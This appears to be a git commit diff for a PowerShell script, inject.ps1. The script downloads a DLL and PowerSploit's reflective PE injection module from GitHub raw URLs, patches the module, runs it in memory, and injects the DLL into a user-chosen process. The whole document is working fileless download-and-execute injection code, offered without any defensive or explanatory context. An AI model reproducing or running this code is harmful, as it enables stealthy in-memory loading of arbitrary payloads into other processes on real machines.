0c05e986717de592db1bdbf81b14a7fc0c7e610d
xxx_x1 <newniwnew020@gmail.com>
2026-03-22 08:08:17 +0700

    Update and rename inject_fileless.ps1 to inject.ps1

--- inject.ps1
+++ inject.ps1
@@ -1,12 +1,7 @@
-# inject_short.ps1
-
 $dllUrl = "https://raw.githubusercontent.com/newgen319/xxx_x1/refs/heads/main/xxx_x1_x64.dll"
 $dllBytes = (iwr -UseBasicParsing $dllUrl).Content
 $ps1 = (iwr -UseBasicParsing "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1").Content
 $ps1 = $ps1 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
 $ps1 = $ps1 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
 . ([ScriptBlock]::Create($ps1))
-
-Get-Process | Select Id, ProcessName | Format-Table -AutoSize
-$p = Read-Host "Enter PID"
-Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId $p
+Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId (Read-Host "Enter PID")
